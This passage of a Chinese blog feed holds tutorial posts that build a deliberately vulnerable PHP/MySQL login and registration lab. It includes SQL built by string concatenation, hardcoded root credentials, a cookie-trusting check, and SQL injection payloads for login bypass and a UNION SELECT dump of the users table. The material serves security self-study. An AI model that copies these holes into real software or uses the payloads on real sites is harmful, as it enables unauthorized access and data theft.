class="string">&quot;&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;0 结果&lt;/div&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151236386.png" alt="image-20231115123607783" style="zoom:50%;" /><p>5，将上述两个功能块加入书主页面</p><p>在main.php中写入以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">left</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">include</span> &#x27;<span class="title">upload</span>.<span class="title">php</span>&#x27;; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">right</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">include</span> &#x27;<span class="title">mycomments</span>.<span class="title">php</span>&#x27;; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图所示：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151238867.png" alt="image-20231115123847445" style="zoom: 33%;" /><p>6，新建signip.php和link_ip.php，编写注册页面</p><p>在link_ip.php中写入以下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html; charset= utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$username</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password1</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>]);</span><br><span class="line"><span class="variable">$password2</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;security&quot;</span>);</span><br><span class="line">    <span class="comment">// 检查连接是否成功  </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;跳转到登录页面！&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;signup&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>) || <span class="keyword">empty</span>(<span class="variable">$password1</span>) || <span class="keyword">empty</span>(<span class="variable">$password2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;输入不能为空！&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: signup.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;两次输入的密码不一致&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: signup.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;两次输入的密码一致！&quot;</span>;</span><br><span class="line">        <span class="variable">$seclect</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password1</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$seclect</span>);</span><br><span class="line">        <span class="keyword">if</span>((<span class="variable">$result</span>-&gt;num_rows)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;该用户已存在！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: signup.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,0)&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;用户注册成功！&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> ;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> ;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;用户注册失败！&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: signup.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图所示：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151242265.png" alt="image-20231115124242563" style="zoom: 33%;" /><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，登录页面有SQL注入漏洞查询数据库名称&lt;/p&gt;
&lt;p&gt;在用户名输入框输入：0’ union select 1,database(),3– -&lt;/p&gt;
&lt;p&gt;2，登录页面有SQL注入罗东查询uses表中的所有数据&lt;/p&gt;
&lt;p&gt;在用户名输入框输入：0’ union sel</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>九，php搭建登录页面</title>
    <link href="http://example.com/2023/11/13/%E4%B9%9D%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/"/>
    <id>http://example.com/2023/11/13/%E4%B9%9D%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2/</id>
    <published>2023-11-13T09:14:32.000Z</published>
    <updated>2023-11-13T10:06:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>1，在官网<a href="https://www.xp.cn/%E4%B8%8B%E8%BD%BD%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BFPHP">https://www.xp.cn/下载小皮面板PHP</a> study</p><p>2，打开PHP study开启Apache和MySQL环境</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311131806416.png" alt="image-20231113180623185" style="zoom:67%;" /><p>3，点击网站项，打开网站根目录：C:\phpStudy_64\phpstudy_pro\WWW</p><p>4，删除初始文件，新建index.php文件，用vscode进行编辑HTML效果为：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311131721179.png" style="zoom: 67%;" /><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">&lt;title&gt;白的网站&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;用户名：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;/td&gt;&lt;br&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;密码：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;&lt;br&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=&quot;checkbox&quot; name=&quot;rember&quot; value=&quot;yes&quot;&gt;记住密码&lt;/td&gt;&lt;br&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=&quot;reset&quot; name=&quot;reset&quot; value=&quot;重置&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>5，用PHP编写登录功能，</p><p>若用户名或密码的输入为空，则显示用户名或密码为空，并返回index页面</p><p>若输入的用户名和密码在数据库中没有或不对应，则显示用户名或密码不正确，并返回index页面</p><p>若输入的用户名和密码在数据库中存在且对应，则跳转到zhuye页面</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html; charset= utf-8&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$username=trim($_POST[&#x27;username&#x27;]);</span><br><span class="line">$password=trim($_POST[&#x27;password&#x27;]);</span><br><span class="line"></span><br><span class="line">echo strlen($username);</span><br><span class="line">echo strlen($password);</span><br><span class="line">if(empty($username) || empty($password))&#123;</span><br><span class="line">echo &#x27;用户或密码不能为空！&#x27;;</span><br><span class="line">header(&quot;Location: index.php&quot;);</span><br><span class="line">exit;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);</span><br><span class="line">// 检查连接是否成功  </span><br><span class="line">if ($conn-&gt;connect_error) &#123;  </span><br><span class="line">    echo &quot;数据库连接失败&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;数据库连接成功！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$seclect=&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$password&#x27; &quot;;</span><br><span class="line">$result=$link-&gt;query($seclect);</span><br><span class="line">if(($result-&gt;num_rows)&gt;0)&#123;</span><br><span class="line">$_SESSION[&#x27;user&#x27;]=$username;</span><br><span class="line">setcookie(&#x27;user&#x27;,$username,time()+7*12*60*60);</span><br><span class="line">echo &quot;登录成功！&quot;;</span><br><span class="line">header(&quot;Location: zhuye.php&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &#x27;账号或密码错误！&#x27;;</span><br><span class="line">header(&quot;Location: index.php&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>6，编写zhuye页面，先检测是否有user cookie</p><p>若存在，则显示成功，用户名和user cookie的值</p><p>若不存在，则显示失败</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html; charset= utf-8&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_COOKIE[user]))&#123;</span><br><span class="line">    echo &quot;成功&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;用户名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;登录时设置的user cookie：&quot;.$_COOKIE[user];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;失败！&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>登录成功效果如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311131803391.png" alt="image-20231113180340921" style="zoom:67%;" /><p>7，可以通过在浏览器的开发者工具和yakit中更改cookie的值来修改登录后的页面，效果如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311131733421.png" alt="image-20231113173347976" style="zoom:67%;" /><p>8，因为sql语句”select * from users where username&#x3D;’$username’ and password&#x3D;’$password’ “;是拼接的，所以当用户名输入’or’1&#x3D;1，密码也输入’or’1&#x3D;1时会发生SQL注入也可以登录成功，效果如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311131802729.png" alt="image-20231113180218161" style="zoom:67%;" /><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1，在官网&lt;a href=&quot;https://www.xp.cn/%E4%B8%8B%E8%BD%BD%E5%B0%8F%E7%9A%AE%E9%9D%A2%E6%9D%BFPHP&quot;&gt;https://www.xp.cn/下载小皮面板PHP&lt;/a&gt; study&lt;/p&gt;
&lt;p&gt;2</summary>
      
    
    
    
    
  </entry>
  
</feed>
